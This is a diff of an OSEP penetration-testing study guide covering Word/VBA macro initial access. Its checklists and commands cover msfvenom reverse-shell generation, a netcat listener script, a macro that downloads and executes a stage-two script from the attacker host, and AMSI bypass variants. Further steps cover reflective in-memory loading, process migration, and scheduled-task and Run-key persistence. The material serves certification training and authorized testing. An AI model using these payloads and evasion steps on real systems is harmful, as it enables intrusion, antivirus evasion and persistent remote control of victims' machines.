@@ -2,71 +2,46 @@
 For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
 :::
 
-# 01 · Word / VBA macro entry and payload shapes
+# Word / VBA macro entry
 
-> **Covers scenarios:** 1, 2, 3, 4, 5
->
-> **Course mapping:** Chapter 4 (macros and initial access), Chapter 10 (process migration and lifecycle), Chapter 11 (evasion and encoding)
->
-> **Prerequisites:** deliverable `.docm`/`.doc`; Office installed on the target; attacker has an HTTP delivery service (`m00-delivery-server.py`); both x86 and x64 Runners already compiled
+If Office will run a macro, this is usually the fastest initial-access path. Keep stage one short — trigger, fetch, hand off. Name the failure before you rewrite the payload: macro never ran vs macro ran but the next stage was blocked.
 
-**Shared principles for this module**:
-1. **Probe first, deliver second** — when Office bitness is unknown, delivering a Runner directly is a gamble.
-2. **The less the macro does, the more stable it is** — stage one’s only job is “trigger + fetch the next step.”
-3. **On failure, first separate “macro never ran” from “macro ran but the next stage was blocked”** — the fixes are completely different.
+## Unknown bitness, AV present
 
----
+If Office bitness is unknown and AV is present, probe first — delivering a Runner on the wrong arch is a gamble.
 
-## Scenario 1: Site accepts a Word file and opens it automatically; target has AV; Office bitness unknown
+- [ ] Start the delivery server and watch the log
+- [ ] Generate both shellcodes and start a listener
+- [ ] Deliver the harmless callback macro (`m01-callback-ping.vba` → paste into `ThisDocument`, save `.docm`)
+- [ ] Deliver the arch probe (`m01-detect-arch.vba`)
+- [ ] Embed **only** the matching Runner (never both) and upload
 
-**Situation**: A recruiting site allows `.docm` upload; a back-office user opens it and macros can fire; Defender is present, but **you do not know whether Office is 32-bit or 64-bit**. Public macro samples may be detected, or crash on bitness mismatch.
+Start the delivery server:
 
-**Assumptions**:
-- You have an upload entry and can observe “document was opened” (callback arrives).
-- Target macro security allows execution (or the user will click “Enable Content”).
-- Attacker HTTP delivery service is up; logs are readable.
+```bash
+python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads
+```
 
-**Prepare (attacker side)**:
+Generate shellcode and listen:
 
-1. Start the delivery service and watch logs:
-   ```bash
-   python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads
-   ```
-2. Prepare three artifacts (all pre-validated):
-   | Artifact | File | Role |
-   |---|---|---|
-   | Harmless callback macro | `m01-callback-ping.vba` | Only proves macro fired and egress works |
-   | Architecture-detect macro | `m01-detect-arch.vba` | Reports Office bitness |
-   | Runner | `m01-shellcode-runner-vba-x86.vba` / `-x64.vba` | Choose by bitness |
-3. Generate two shellcode sets (x86/x64 separately):
-   ```bash
-   msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f c -o sc-x64.c
-   msfvenom -p windows/shell_reverse_tcp   LHOST=LHOST LPORT=LPORT -f c -o sc-x86.c
-   ```
-4. Start listener: `bash m00-listener.sh 4444`
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f c -o sc-x64.c
+msfvenom -p windows/shell_reverse_tcp   LHOST=<LHOST> LPORT=<LPORT> -f c -o sc-x86.c
+bash m00-listener.sh 4444
+```
 
-**Procedure**:
+A `GET /worked` in the delivery log means the macro ran and can talk out. The arch probe returns `64-bit: True/False`.
 
-1. Paste `m01-callback-ping.vba` into Word `ThisDocument`, save as `.docm`, upload.
-2. Watch delivery logs: `GET /worked` → macro really ran and can egress.
-3. Swap in `m01-detect-arch.vba`, wait for the report (log includes `64-bit: True/False`).
-4. Embed the matching-bitness Runner into the macro (**do not embed both** — size and signatures double), upload.
-5. On the listener confirm callback, then immediately run:
-   ```cmd
-   whoami /priv
-   systeminfo | findstr /B /C:"OS Name" /C:"System Type"
-   ```
+On callback:
 
-**Scripts used**:
-| Script | Purpose | Key parameters |
-|---|---|---|
-| `m01-callback-ping.vba` | Harmless callback; verify macro and egress | replace `LHOST` |
-| `m01-detect-arch.vba` | WMI Office bitness + report | replace `LHOST` |
-| `m01-shellcode-runner-vba-x86.vba` | 32-bit Runner | replace shellcode array |
-| `m01-shellcode-runner-vba-x64.vba` | 64-bit Runner | replace shellcode array |
-| `m01-shellcode-runner-vba-archbranch.vba` | Auto bitness branch | embed both shellcode sets |
+```cmd
+whoami /priv
+systeminfo | findstr /B /C:"OS Name" /C:"System Type"
+```
 
-#### `m00-delivery-server.py`
+If there is no request in the delivery log, the doc never opened or MotW / macro security blocked it — try a zip, SMB share, legacy `.doc`, or `.xlsm`. If there is a request but no callback, egress is blocked: embed stage two or switch to SMB delivery. If the WMI bitness probe fails, deliver `archbranch` (`#If Win64` at compile time) or check `ProgramFiles(x86)`. If the macro itself is killed, split strings / strip template fingerprints, or switch to HTA / JScript (modules 02 / 03).
+
+::: details `m00-delivery-server.py` · click to expand
 
 ````python
 #!/usr/bin/env python3
@@ -223,7 +198,73 @@ if __name__ == "__main__":
     sys.exit(main())
 ````
 
-#### `m01-callback-ping.vba`
+:::
+
+::: details `m00-listener.sh` · click to expand
+
+````bash
+#!/usr/bin/env bash
+# Purpose: Standard listener — readline, session logging, port-in-use check,
+#          optional auto HTTP delivery
+# Scenario: Shared infrastructure (every reverse shell / C2 session; supports docs/00 and all modules)
+# Dependencies: ncat or nc, rlwrap (optional), lsof
+# Usage: bash m00-listener.sh 4444 [LOGDIR] [--http]
+#        Example: bash m00-listener.sh 4444 ~/osep/logs --http
+# Placeholders: LPORT=listen port (arg 1), LOGDIR=log directory (arg 2, default ~/osep/logs)
+# Test status: bash -n syntax checked (this macOS host has no ncat; listen not lab-tested)
+set -euo pipefail
+
+LPORT="${1:-}"
+LOGDIR="${2:-$HOME/osep/logs}"
+WITH_HTTP=0
+[[ "${3:-}" == "--http" || "${2:-}" == "--http" ]] && WITH_HTTP=1
+
+if [[ -z "$LPORT" ]]; then
+  echo "Usage: bash $0 LPORT [LOGDIR] [--http]" >&2
+  exit 1
+fi
+
+mkdir -p "$LOGDIR"
+LOGFILE="$LOGDIR/shell-$LPORT.log"
+
+# --- Port-in-use check ---
+if command -v lsof >/dev/null 2>&1 && lsof -nP -iTCP:"$LPORT" -sTCP:LISTEN >/dev/null 2>&1; then
+  echo "[!] Port $LPORT is already in use:" >&2
+  lsof -nP -iTCP:"$LPORT" -sTCP:LISTEN >&2
+  echo "[!] Change port or stop the occupying process." >&2
+  exit 1
+fi
+
+# --- Optional: also start HTTP delivery ---
+if [[ "$WITH_HTTP" -eq 1 ]]; then
+  if [[ -d "$HOME/osep/payloads" ]]; then
+    echo "[*] Starting HTTP delivery (port 80), log: $LOGDIR/http-80.log"
+    (cd "$HOME/osep/payloads" && python3 -m http.server 80 >"$LOGDIR/http-80.log" 2>&1 &) || \
+      echo "[!] HTTP delivery failed to start (port may be in use); start it separately"
+  else
+    echo "[!] $HOME/osep/payloads not found; skipping HTTP delivery"
+  fi
+fi
+
+# --- Choose listener ---
+echo "[*] Listening on 0.0.0.0:$LPORT, log: $LOGFILE"
+echo "[*] Tip: first commands on a session — whoami /priv, systeminfo, egress probe (see m00-recon-defenses.ps1)"
+
+if command -v rlwrap >/dev/null 2>&1 && command -v ncat >/dev/null 2>&1; then
+  rlwrap -cAr ncat -lvnp "$LPORT" --keep-open 2>&1 | tee -a "$LOGFILE"
+elif command -v rlwrap >/dev/null 2>&1; then
+  rlwrap -cAr nc -lvnp "$LPORT" 2>&1 | tee -a "$LOGFILE"
+elif command -v ncat >/dev/null 2>&1; then
+  ncat -lvnp "$LPORT" --keep-open 2>&1 | tee -a "$LOGFILE"
+else
+  echo "[!] rlwrap/ncat/nc not found; install: sudo apt install -y ncat rlwrap" >&2
+  exit 1
+fi
+````
+
+:::
+
+::: details `m01-callback-ping.vba` · click to expand
 
 ````vb
 ' Purpose: Harmless callback macro. Confirms the macro actually ran after the
@@ -333,7 +374,9 @@ Public Sub Document_Open()
 End Sub
 ````
 
-#### `m01-detect-arch.vba`
+:::
+
+::: details `m01-detect-arch.vba` · click to expand
 
 ````vb
 ' Purpose: Detect Office host bitness and report it (required before delivering a payload)
@@ -392,7 +435,9 @@ Sub Document_Open()
 End Sub
 ````
 
-#### `m01-shellcode-runner-vba-x86.vba`
+:::
+
+::: details `m01-shellcode-runner-vba-x86.vba` · click to expand
 
 ````vb
 ' Purpose: In-process shellcode Runner under x86 (32-bit) Office
@@ -458,7 +503,9 @@ End Sub
 #End If
 ````
 
-#### `m01-shellcode-runner-vba-x64.vba`
+:::
+
+::: details `m01-shellcode-runner-vba-x64.vba` · click to expand
 
 ````vb
 ' Purpose: In-process shellcode Runner under x64 Office (no PowerShell/child process)
@@ -539,69 +586,9 @@ End Sub
 #End If
 ````
 
-#### `m00-listener.sh`
+:::
 
-````bash
-#!/usr/bin/env bash
-# Purpose: Standard listener — readline, session logging, port-in-use check,
-#          optional auto HTTP delivery
-# Scenario: Shared infrastructure (every reverse shell / C2 session; supports docs/00 and all modules)
-# Dependencies: ncat or nc, rlwrap (optional), lsof
-# Usage: bash m00-listener.sh 4444 [LOGDIR] [--http]
-#        Example: bash m00-listener.sh 4444 ~/osep/logs --http
-# Placeholders: LPORT=listen port (arg 1), LOGDIR=log directory (arg 2, default ~/osep/logs)
-# Test status: bash -n syntax checked (this macOS host has no ncat; listen not lab-tested)
-set -euo pipefail
-
-LPORT="${1:-}"
-LOGDIR="${2:-$HOME/osep/logs}"
-WITH_HTTP=0
-[[ "${3:-}" == "--http" || "${2:-}" == "--http" ]] && WITH_HTTP=1
-
-if [[ -z "$LPORT" ]]; then
-  echo "Usage: bash $0 LPORT [LOGDIR] [--http]" >&2
-  exit 1
-fi
-
-mkdir -p "$LOGDIR"
-LOGFILE="$LOGDIR/shell-$LPORT.log"
-
-# --- Port-in-use check ---
-if command -v lsof >/dev/null 2>&1 && lsof -nP -iTCP:"$LPORT" -sTCP:LISTEN >/dev/null 2>&1; then
-  echo "[!] Port $LPORT is already in use:" >&2
-  lsof -nP -iTCP:"$LPORT" -sTCP:LISTEN >&2
-  echo "[!] Change port or stop the occupying process." >&2
-  exit 1
-fi
-
-# --- Optional: also start HTTP delivery ---
-if [[ "$WITH_HTTP" -eq 1 ]]; then
-  if [[ -d "$HOME/osep/payloads" ]]; then
-    echo "[*] Starting HTTP delivery (port 80), log: $LOGDIR/http-80.log"
-    (cd "$HOME/osep/payloads" && python3 -m http.server 80 >"$LOGDIR/http-80.log" 2>&1 &) || \
-      echo "[!] HTTP delivery failed to start (port may be in use); start it separately"
-  else
-    echo "[!] $HOME/osep/payloads not found; skipping HTTP delivery"
-  fi
-fi
-
-# --- Choose listener ---
-echo "[*] Listening on 0.0.0.0:$LPORT, log: $LOGFILE"
-echo "[*] Tip: first commands on a session — whoami /priv, systeminfo, egress probe (see m00-recon-defenses.ps1)"
-
-if command -v rlwrap >/dev/null 2>&1 && command -v ncat >/dev/null 2>&1; then
-  rlwrap -cAr ncat -lvnp "$LPORT" --keep-open 2>&1 | tee -a "$LOGFILE"
-elif command -v rlwrap >/dev/null 2>&1; then
-  rlwrap -cAr nc -lvnp "$LPORT" 2>&1 | tee -a "$LOGFILE"
-elif command -v ncat >/dev/null 2>&1; then
-  ncat -lvnp "$LPORT" --keep-open 2>&1 | tee -a "$LOGFILE"
-else
-  echo "[!] rlwrap/ncat/nc not found; install: sudo apt install -y ncat rlwrap" >&2
-  exit 1
-fi
-````
-
-#### `m01-shellcode-runner-vba-archbranch.vba`
+::: details `m01-shellcode-runner-vba-archbranch.vba` · click to expand
 
 ````vb
 ' Purpose: Use VBA compile-time constants to match Office bitness automatically,
@@ -689,56 +676,28 @@ Sub Document_Open()
 End Sub
 ````
 
-**Validation**:
-- Delivery log shows a request (document was opened)
-- Callback log shows `worked` or a bitness report (macro ran + egress)
-- Listener gets a session (Runner worked)
+:::
 
-**Failure branches and alternatives**:
-1. **Delivery log has no requests** → document never opened, or macros blocked by security settings. Check Mark-of-the-Web (ZIP delivery or opening from an SMB share can bypass MotW); or switch to legacy `.doc`, or `.xlsm`.
-2. **Request seen but no callback** → macro ran but egress blocked. Switch to an embedded stage 2 (scenario 17) or change the HTTP→SMB delivery path.
-3. **Bitness detect fails** (WMI blocked) → multi-path env probes (`ProgramFiles(x86)` presence) or deliver the `archbranch` version directly.
-4. **Macro itself blocked by Defender** → see scenario 18: split strings, strip public-template signatures, or switch to HTA/JScript entry (M02/M03).
+## Macro runs, Office won’t start PowerShell
 
-**Exam / OPSEC notes**: when a macro is blocked, do not re-upload the same file repeatedly; record each change and its result. Bitness probing must happen **before** payload delivery, or you will burn a lot of time on mismatches.
+If `Shell "powershell ..."` / `WScript.Shell.Run` is blocked, switch to a no-child-process path — stay inside `WINWORD.EXE`.
 
----
+- [ ] Confirm the macro still runs with the callback macro
+- [ ] Deliver the pure VBA Runner (`VirtualAlloc` → `RtlMoveMemory` → `CreateThread`)
+- [ ] Keep `powershell` / `cmd` out of the macro body
+- [ ] On callback, confirm no new suspicious children
 
-## Scenario 2: Word opens automatically, but Office launching PowerShell is blocked
-
-**Situation**: The macro can run, but starting `powershell.exe` from it fails — the target may restrict Office child processes or detect that process chain.
-
-**Assumptions**:
-- Scenario 1 callback macro already proved the macro can run.
-- `Shell "powershell ..."` / `WScript.Shell.Run` is blocked or terminated by AV.
-
-**Prepare (attacker side)**: prepare **two VBA paths that create no child process**
-1. **Pure VBA + Win32 API shellcode**: `VirtualAlloc` → `RtlMoveMemory` → `CreateThread`, all inside `WINWORD.EXE`.
-2. **VBA calling .NET**: load a managed assembly via `GetObject("new:...")` / COM or `CreateObject` (some environments need `mscoree`).
-
-```text
-Build/prepare: m01-shellcode-runner-vba-x64.vba (with PtrSafe declarations and bitness branch)
-Backup: m01-embedded-dotnet-runner.vba (load .NET assembly from inside VBA)
+```cmd
+wmic process where (ParentProcessId=<WINWORD_PID>) get Name,ProcessId
 ```
 
-**Procedure**:
+If closing Word kills the session, stabilize first (see below) — don’t start privilege escalation yet.
 
-1. Confirm with the callback macro that macros still run (rule out “macro blocked entirely”).
-2. Deliver the pure VBA Runner: no `powershell`, `cmd`, or `wscript` strings in the macro.
-3. Confirm callback on the listener; also confirm there is **no** new `powershell.exe`:
-   ```cmd
-   tasklist | findstr /I "powershell cmd wscript cscript"
-   ```
-4. If callback works but the session is fragile (dies when Word closes) → go straight to scenario 5.
+Fallback: load a .NET assembly from VBA (`m01-embedded-dotnet-runner.vba`).
 
-**Scripts used**:
-| Script | Purpose | Key parameters |
-|---|---|---|
-| `m01-shellcode-runner-vba-x64.vba` | In-process exec; no child process | shellcode array |
-| `m01-embedded-dotnet-runner.vba` | Load .NET assembly from VBA | assembly Base64 |
-| `m01-callback-ping.vba` | Rule out “macro blocked entirely” | LHOST |
+If VBA Win32 APIs are blocked by ASR, try COM (`MMC20.Application` / `Shell.Application`) or the managed-assembly path. If the macro runs but nothing executes, change host form: HTA (module 02) or JScript (module 03). If Word crashes, bitness mismatch (back to unknown-bitness) or shellcode didn’t decrypt cleanly.
 
-#### `m01-embedded-dotnet-runner.vba`
+::: details `m01-embedded-dotnet-runner.vba` · click to expand
 
 ````vb
 ' Purpose: Load and run a .NET assembly directly from VBA (no download, no PowerShell child)
@@ -801,51 +760,26 @@ Sub Document_Open()
 End Sub
 ````
 
-**Validation**: `tasklist` shows no Office child processes but the listener has a session; `whoami` returns the expected user.
+:::
 
-**Failure branches and alternatives**:
-1. **In-VBA API calls blocked** (Defender ASR “block Office child processes/injection”) → COM objects (e.g. `MMC20.Application`, `Shell.Application`), or pure VBA loading a managed assembly.
-2. **Macro runs but cannot execute any code** (language/permission limits) → change entry: HTA (M02), JScript (M03).
-3. **In-process exec crashes Word** → bitness mismatch (return to scenario 1 probe) or incomplete shellcode decrypt.
+## PowerShell starts, stage-two blocked by AMSI
 
-**Exam / OPSEC notes**: this path’s main value is “no suspicious process chain.” Validate PtrSafe declarations and bitness branches on a local Office version before delivery.
+If the macro launches PowerShell and the delivery log shows stage2 being fetched, but the script content is blocked, fix AMSI before changing the whole chain.
 
----
+Short macro launches PowerShell:
 
-## Scenario 3: Word can launch PowerShell, but the stage-2 script is scanned and blocked
+```vb
+Shell "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/<stage2.ps1>')"
+```
 
-**Situation**: After upload you can confirm PowerShell started, but downloading or interpreting stage 2 shows “script content blocked” — classic AMSI intercept.
+- [ ] Prove the path end-to-end with a **harmless** stage2 first
+- [ ] Swap in the real stage2; on block, prepend an AMSI handler (`m05-amsi-bypass-variants.ps1`, variants 1→4, one at a time)
+- [ ] Still blocked → split “AMSI handler” and “real payload” into two files; handle first, then fetch
+- [ ] Still blocked → drop PowerShell; use the managed-assembly path below, or HTA / JScript
 
-**Assumptions**:
-- Macro → PowerShell chain already proven (control results from scenarios 1/2).
-- Block is at the **script content** layer, not the network (delivery log shows stage2 was requested).
+If the AMSI handler itself is blocked, string-concat / encode it, or reflectively load .NET and skip the script path. If every variant fails, changing host form is usually faster than grinding AMSI. If the download is blocked but the script isn’t, it’s network / proxy — see [egress channels](/modules/09-c2-egress-channels).
 
-**Prepare (attacker side)**:
-1. Short macro stage 1 (keep it tiny to reduce macro signatures):
-   ```vb
-   Sub AutoOpen()
-       Shell "powershell -nop -w hidden -ep bypass -enc <BASE64>", vbHide
-   End Sub
-   ```
-2. AMSI-handling script **matched to the PowerShell host**: `m05-amsi-bypass-variants.ps1`
-3. A **harmless stage2** (callback / write a file only) for staged validation.
-
-**Procedure**:
-
-1. First run the full chain with harmless stage2 (macro → PS → download → exec).
-2. Swap in real stage2; watch for `This script contains malicious content and has been blocked by your antivirus software`.
-3. When blocked: load AMSI handling at the very front of stage2 (try versions 1→2→3→4 one at a time).
-4. Still blocked → split stage2 into “AMSI handling script + real payload script” as two files; handle first, then fetch payload.
-5. Still blocked → leave the PowerShell path (managed assembly reflective load, scenario 4) or change host (JScript/HTA).
-
-**Scripts used**:
-| Script | Purpose | Key parameters |
-|---|---|---|
-| `m05-amsi-bypass-variants.ps1` | Multi-version AMSI handling + probe | `-Variant 1..6` |
-| `m01-stager-download-encrypted.ps1` | Encrypted/obfuscated download-exec stage2 | LHOST/URL |
-| `m01-reflective-runner.ps1` | Reflective load; bypass scanning of on-disk scripts | assembly path |
-
-#### `m05-amsi-bypass-variants.ps1`
+::: details `m05-amsi-bypass-variants.ps1` · click to expand
 
 ````powershell
 <#
@@ -979,7 +913,9 @@ if ($ProbeOnly) {
 }
 ````
 
-#### `m01-stager-download-encrypted.ps1`
+:::
+
+::: details `m01-stager-download-encrypted.ps1` · click to expand
 
 ````powershell
 <#
@@ -1063,7 +999,9 @@ try {
 }
 ````
 
-#### `m01-reflective-runner.ps1`
+:::
+
+::: details `m01-reflective-runner.ps1` · click to expand
 
 ````powershell
 <#
@@ -1140,53 +1078,27 @@ try {
 }
 ````
 
-**Validation**: delivery log shows stage2 was requested; then whether a session established; finally re-probe AMSI status.
+:::
 
-**Failure branches and alternatives**:
-1. **AMSI handling script itself blocked** → string-concat/encoded versions, or switch to a reflectively loaded .NET assembly (avoids the AMSI script path).
-2. **All versions fail** (target is well patched) → abandon PowerShell; use scenario 4’s precompiled C# or other hosts in M02/M03.
-3. **stage2 download blocked but script not** → network/proxy issue; see [09-c2-egress-channels](/modules/09-c2-egress-channels).
+## `Add-Type` temp files get deleted
 
-**Exam / OPSEC notes**: AMSI handling is “version warfare”; the exam environment usually has a working version — but do not bet all time on it — **changing host shape is often faster**.
+If PowerShell works and isn’t in CLM, but `%TEMP%` assemblies from `Add-Type` are deleted, switch to reflective / in-memory load.
 
----
+```powershell
+[System.Reflection.Assembly]::Load([Convert]::FromBase64String($b64)).EntryPoint.Invoke($null, @(,[string[]]@()))
+```
 
-## Scenario 4: Word entry works, but files from PowerShell dynamic compile are deleted
+Precompile the Runner on the attacker side:
 
-**Situation**: Macro and PowerShell both start; language mode is not constrained; but an `Add-Type`-based Runner fails because temp files from dynamic compile are detected and deleted.
+```bash
+csc /nologo /platform:x64 /out:runner.exe m01-shellcode-runner-x64.cs
+```
 
-**Assumptions**:
-- PowerShell is available and not in CLM.
-- Block is on temp assembly files produced by `Add-Type` (random names under `%TEMP%`).
+Embed the assembly as Base64 (fewer on-disk DLLs) and invoke the entry. For `Main`, wrap as `Invoke($null, @(,[string[]]@()))`. Stabilize the session immediately after callback.
 
-**Prepare (attacker side)**:
-1. **Reflective Runner** (in-memory load of a prebuilt assembly; no dynamic compile):
-   ```powershell
-   $b = [Convert]::FromBase64String($enc); $asm = [Reflection.Assembly]::Load($b)
-   $asm.EntryPoint.Invoke($null, @(,[string[]]@()))
-   ```
-2. **Precompiled C# Runner** (compile once on attacker or target with `csc.exe`; afterward deliver only DLL/bytes):
-   ```bash
-   # Attacker (if mono/dotnet available)
-   mcs -target:library -out:runner.dll m01-shellcode-runner-x64.cs
-   ```
+If assembly load is blocked by AMSI, do the AMSI handling above first. If the assembly is statically detected, change strings / strip templates, or XOR the shellcode and use pure P/Invoke. If unsigned assemblies are forbidden, use a trusted host (module 05).
 
-**Procedure**:
-
-1. Confirm the failure point is `Add-Type`: replace `Add-Type` in the Runner with `[Reflection.Assembly]::Load($bytes)` and retry.
-2. Embed the assembly as Base64 (avoid delivering a DLL file that is statically detected).
-3. Reflect into the entry with required arguments.
-4. If the assembly entry is `Main`, watch the signature: `Invoke($null, @(,[string[]]@()))` (note the `string[]` wrapping).
-5. After success, stabilize the session immediately (scenario 5).
-
-**Scripts used**:
-| Script | Purpose | Key parameters |
-|---|---|---|
-| `m01-reflective-runner.ps1` | Reflectively load .NET assembly | `-Path` / `-Base64` |
-| `m01-shellcode-runner-x64.cs` | Precompiled Runner source | shellcode ciphertext + key |
-| `m01-stager-download-encrypted.ps1` | Encrypted stager | LHOST/URL |
-
-#### `m01-shellcode-runner-x64.cs`
+::: details `m01-shellcode-runner-x64.cs` · click to expand
 
 ````csharp
 // Purpose: Custom x64 shellcode Runner (precompile to avoid Add-Type temp files on disk)
@@ -1272,56 +1184,32 @@ class Runner
 }
 ````
 
-**Validation**: no new compiled assemblies under `%TEMP%`; `[AppDomain]::CurrentDomain.GetAssemblies()` shows the loaded assembly; listener has a session.
+:::
 
-**Failure branches and alternatives**:
-1. **Assembly load blocked by AMSI** → do AMSI handling first (scenario 3), then load.
-2. **Assembly itself statically detected** → custom Runner (change strings / strip public-template signatures), or XOR-encoded shellcode + pure P/Invoke.
-3. **Unsigned assembly load fully forbidden** → trusted hosts (M05 scenarios 23/24).
+## In, but closing Word kills the session
 
-**Exam / OPSEC notes**: `Add-Type` failures often leave evidence of temp DLLs deleted under `%TEMP%` — good report material — but the exam goal is a session; do not linger here.
+If closing Word kills the session, migrate or persist first — don’t start privilege escalation yet.
 
----
+Migrate to a same-user resident process:
 
-## Scenario 5: Word payload gets a session, but closing the document kills it
+```text
+migrate <PID>          # same user, same bitness
+```
 
-**Situation**: After upload you have a session, but the back-office user soon closes Word and the session dies; the target process list has long-running programs under the same user. → You need to **leave the initial document lifecycle**.
+Without a migrate helper, spawn the payload detached via `CreateProcess` so it outlives the parent.
 
-**Assumptions**:
-- You have a usable session, but the host process is `WINWORD.EXE`.
-- Current user can create scheduled tasks / write the registry (normal users can write HKCU).
+User-level persistence hook (optional for the exam, stops mid-run drops):
 
-**Prepare (attacker side)**: prepare three migration options by “user / bitness / rights”
+```cmd
+schtasks /create /sc onlogon /tn Updater /tr "C:\Users\Public\update.exe" /f
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Users\Public\update.exe" /f
+```
 
-| Condition | Migration target | Method |
-|---|---|---|
-| Normal user + x64 | `explorer.exe`, `RuntimeBroker.exe`, installed resident apps | Process inject / migrate |
-| Normal user + need persistence | Scheduled task (user-level), HKCU Run key | Relaunch as independent process |
-| Have admin | Service, machine-level scheduled task | Service-style payload |
+Close Word and confirm the session stays up. With admin rights, service-level persistence: `m06-service-hijack.ps1`.
 
-**Procedure**:
+If migrate fails, pick a **same-user, same-bitness** process, or spawn detached instead of injecting. If injection is blocked, relaunch via scheduled task or `cmd /c start` to detach. If it dies right after migrate, the new host is monitored — try `sihost.exe` or an installed third-party resident.
 
-1. After getting a session, the **first action** is not privilege escalation — it is stabilization:
-   ```text
-   Meterpreter: migrate -N explorer.exe     # or getpid then pick a same-user resident process
-   Cobalt/custom:  inject into explorer.exe
-   ```
-2. Without a migrate tool, use an “independent process” path: from macro/PowerShell use `CreateProcess` in a detached way so the child survives parent exit.
-3. Optionally add persistence (usually not required on the exam, but prevents mid-exam session loss):
-   ```cmd
-   schtasks /create /tn "Updater" /tr "C:\path\payload.exe" /sc minute /mo 5 /f
-   reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d "C:\path\payload.exe" /f
-   ```
-4. Close Word; confirm the session remains.
-
-**Scripts used**:
-| Script | Purpose | Key parameters |
-|---|---|---|
-| `m01-embedded-dotnet-runner.vba` | Embedded exec; fewer dependencies | assembly Base64 |
-| `m01-reflective-runner.ps1` | Reload payload after migrate | assembly/bytes |
-| `m06-service-hijack.ps1` | Service-level persistence when admin | service name |
-
-#### `m06-service-hijack.ps1`
+::: details `m06-service-hijack.ps1` · click to expand
 
 ````powershell
 <#
@@ -1430,39 +1318,15 @@ Write-Log "[*] After the shell, restore: -Action Restore -ServiceName $ServiceNa
 Write-Log "[*] If restore finds exe locked (payload process still alive): taskkill /F /IM <payload name> then re-run Restore"
 ````
 
-**Validation**: after closing Word, payload process still in `tasklist`; listener session still up; reconnect still works.
+:::
 
-**Failure branches and alternatives**:
-1. **Migrate fails** (target process different bitness / insufficient rights) → pick a **same-user same-bitness** process; or use the “independent process” path instead of inject.
-2. **Injection blocked** → relaunch via scheduled task, or detach with `cmd /c start` so the child leaves the parent.
-3. **Session dies right after migrate** → new host is EDR-watched; switch to another resident process (e.g. `sihost.exe`, an installed third-party resident app).
+## Cheat sheet
 
-**Exam / OPSEC notes**: **the first action after a session is stabilize**, not escalate. Many OSEP candidates lose points here — session appears, then two minutes later it is gone.
-
----
-
-## Module quick reference
-
-| Goal | Command / point |
+| You want to… | Use |
 |---|---|
-| Verify macro and egress | Harmless callback macro (`m01-callback-ping.vba`) |
-| Determine Office bitness | WMI: does `winword.exe` command line contain `Program Files (x86)` |
-| Execute without child process | VBA + `VirtualAlloc`/`CreateThread` (`m01-shellcode-runner-vba-*.vba`) |
-| AMSI block | Host-matched handling version (`m05-amsi-bypass-variants.ps1`) |
-| Add-Type deleted | Reflectively load precompiled assembly (`m01-reflective-runner.ps1`) |
-| Leave document lifecycle | Migrate to same-user resident process / scheduled task / HKCU Run |
-| Bitness unknown | Deliver `archbranch` version, or probe then deliver |
-
-## Related script list
-
-| Script | Notes |
-|---|---|
-| `m01-callback-ping.vba` | Harmless callback macro |
-| `m01-detect-arch.vba` | Bitness detect and report |
-| `m01-shellcode-runner-vba-x86.vba` / `-x64.vba` | In-process Runner |
-| `m01-shellcode-runner-vba-archbranch.vba` | Bitness-branch Runner |
-| `m01-embedded-dotnet-runner.vba` | Embedded .NET load (works without egress too) |
-| `m01-stager-download-encrypted.ps1` | Encrypted download-exec |
-| `m01-reflective-runner.ps1` | Reflective load |
-| `m01-shellcode-runner-x64.cs` | Precompiled Runner source |
-| `m05-amsi-bypass-variants.ps1` | AMSI handling (shared across modules) |
+| Prove the macro and egress | `m01-callback-ping.vba` |
+| Learn Office bitness | `m01-detect-arch.vba`, or deliver `archbranch` |
+| Run without a child process | `m01-shellcode-runner-vba-*.vba` |
+| Beat AMSI | `m05-amsi-bypass-variants.ps1` |
+| Survive `Add-Type` deletion | `m01-reflective-runner.ps1` |
+| Outlive the document | Migrate / scheduled task / HKCU Run |
